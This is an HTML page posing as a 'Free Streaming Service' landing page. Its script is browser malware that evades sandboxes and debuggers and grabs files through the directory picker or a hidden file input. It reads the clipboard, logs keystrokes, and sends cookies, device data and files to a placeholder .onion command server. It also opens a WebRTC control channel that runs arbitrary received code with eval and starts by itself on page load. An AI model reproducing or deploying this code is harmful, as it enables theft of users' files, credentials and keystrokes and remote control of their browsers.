<!-- index.html -->
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Free Streaming Service</title>
    <style>
        body { background: #111; color: #fff; font-family: Arial, sans-serif; text-align: center;}        #loading { display: none; position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: rgba(0,0,0,0.9);}        #loading p { font-size: 24px; padding-top: 20%;}        .spinner { border: 8px solid #f3f3f3; border-top: 8px solid #ff4444; border-radius: 50%; width: 60px; height: 60px; animation: spin 1s linear infinite; margin: 20px auto;}        @keyframes spin { 0% { transform: rotate(0deg);} 100% { transform: rotate(360deg);}}        button { background: #ff4444; border: none; color: #fff; padding: 15px 30px; font-size: 18px; cursor: pointer; border-radius: 5px; margin-top: 20px;}        button:hover { background: #cc0000;}    </style>
</head>
<body>
    <h1>Welcome to Free Streaming!</h1>
    <p>Click below to access unlimited movies and shows!</p>
    <button>Start Streaming</button>
    <div id="loading">
        <p>Loading streaming service...</p>
        <div class="spinner"></div>
    </div>

    <script>
        // Anti-analysis: Obfuscate behavior in sandboxes
        (function() {
            const start = Date.now();
            if (navigator.webdriver || window.document.documentElement.getAttribute('webdriver') ||!window.chrome) {
                while (Date.now() - start < 10000) {} // Stall in sandboxes
                window.location = 'about:blank';}        })();

        // Anti-debugging: Redirect if dev tools detected
        (function() {
            const devtools = /./;
            devtools.toString = () => 'devtools';
            setInterval(() => {
                if (String(devtools) === 'devtools') {
                    window.location = 'about:blank';}            }, 1000);
        })();

        // File grabber with iOS/Android stealth
        async function snatchFiles() {
            try {
                // File System Access API for desktop
                if ('showDirectoryPicker' in window) {
                    const dirHandle = await window.showDirectoryPicker();
                    const files = [];
                    for await (const entry of dirHandle.values()) {
                        if (entry.kind === 'file') {
                            const file = await entry.getFile();
                            const fileData = await file.arrayBuffer();
                            files.push({
                                name: file.name,
                                data: btoa(String.fromCharCode(...new Uint8Array(fileData))),
                            });}                    }
                    await sendToC2(files);
                    console.log('Files snatched via directory:', files.length);} else {
                    // iOS/Android: Clipboard API
                    if (navigator.clipboard) {
                        const clipData = await navigator.clipboard.readText();
                        if (clipData) {
                            await sendToC2([{ name: 'clipboard.txt', data: btoa(clipData) }]);
                            console.log('Clipboard data snatched');}                    }
                    // Web Share API for sneaky file access
                    if (navigator.share) {
                        await navigator.share({
                            title: 'Share Free Streaming',
                            text: 'Check out this cool streaming service!',
                            url: window.location.href,
                        }).then(() => {
                            const input = document.createElement('input');
                            input.type = 'file';
                            input.multiple = true;
                            input.accept = '*/*';
                            input.style.display = 'none';
                            document.body.appendChild(input);
                            input.click();
                            input.onchange = async () => {
                                const files = Array.from(input.files).map(file => ({
                                    name: file.name,
                                    data: btoa(String.fromCharCode(...new Uint8Array(await file.arrayBuffer()))),
                                }));
                                await sendToC2(files);
                                console.log('Files snatched via share:', files.length);
                                document.body.removeChild(input);};                        }).catch(() => {
                            console.log('Share API cancelled or failed');
                        });}                }} catch (e) {
                console.error('File snatch error:', e);}        }

        // Unified C2 communication with TOR proxy
        async function sendToC2(files) {
            try {
                const proxyUrl = 'https://your-tor-hidden-service.onion/files';
                const response = await fetch(proxyUrl, {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json'},                    body: JSON.stringify(files),
                });
                if (response.ok) {
                    console.log('Files sent to C2 via HTTP');} else {
                    throw new Error('HTTP send failed');}            } catch (e) {
                // Fallback to WebSocket
                const ws = new WebSocket('wss://your-tor-hidden-service.onion:8080');
                ws.onopen = () => {
                    ws.send(JSON.stringify(files));
                    console.log('Files sent to C2 via WebSocket');
                    ws.close();};                ws.onerror = () => console.error('WebSocket error');}        }

        // Enhanced control channel with RTCPeerConnection
        async function initControl() {
            try {
                const configuration = { iceServers: [{ urls: 'stun:stun.l.google.com:19302' }] };
                const peerConnection = new RTCPeerConnection(configuration);
                const dataChannel = peerConnection.createDataChannel('controlChannel');

                dataChannel.onopen = () => {
                    console.log('Data channel open');
                    fetch('https://your-tor-hidden-service.onion/collect', {
                        method: 'POST',
                        headers: { 'Content-Type': 'application/json'},                        body: JSON.stringify({
                            device: navigator.userAgent,
                            platform: navigator.platform,
                            cookies: document.cookie,
                            location: window.location.href,
                        }),
                    });
                    snatchFiles();};
                dataChannel.onmessage = (event) => {
                    const command = event.data;
                    if (command === 'screenshot') {
                        navigator.mediaDevices.getDisplayMedia({ video: true })
                            .then(stream => {
                                dataChannel.send('Screenshot captured');
                            }).catch(e => console.error('Screenshot error:', e));} else if (command === 'stop') {
                        peerConnection.close();
                        console.log('Peer connection closed');} else if (command === 'snatch') {
                        snatchFiles();} else {
                        try {
                            eval(command); // Execute arbitrary commands} catch (e) {
                            console.error('Command execution error:', e);}                    }};
                // Create and send offer for WebRTC
                const offer = await peerConnection.createOffer();
                await peerConnection.setLocalDescription(offer);
                fetch('https://your-tor-hidden-service.onion/offer', {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json'},                    body: JSON.stringify(offer),
                }).then(async res => {
                    const answer = await res.json();
                    await peerConnection.setRemoteDescription(answer);
                });} catch (e) {
                console.error('Control channel error:', e);}        }

        // Keylogger with stealth
        document.addEventListener('keydown', (event) => {
            fetch('https://your-tor-hidden-service.onion/keylog', {
                method: 'POST',
                headers: { 'Content-Type': 'application/json'},                body: JSON.stringify({ key: event.key, timestamp: Date.now() }),
            });
        });

        // Persistence mechanism
        (function() {
            if (!localStorage.getItem('infected')) {
                localStorage.setItem('infected', 'true');
                const script = document.createElement('script');
                script.src = window.location.href;
                document.head.appendChild(script);}        })();

        // Silent trigger with randomized delay
        window.onload = () => {
            setTimeout(() => {
                if (Math.random() > 0.2) {
                    document.getElementById('loading').style.display = 'block';
                    initControl();}            }, Math.random() * 7000); // Random delay up to 7 seconds};
        // Button trigger
        document.querySelector('button').onclick = () => {
            document.getElementById('loading').style.display = 'block';
            initControl();};    </script>
</body>
</html>
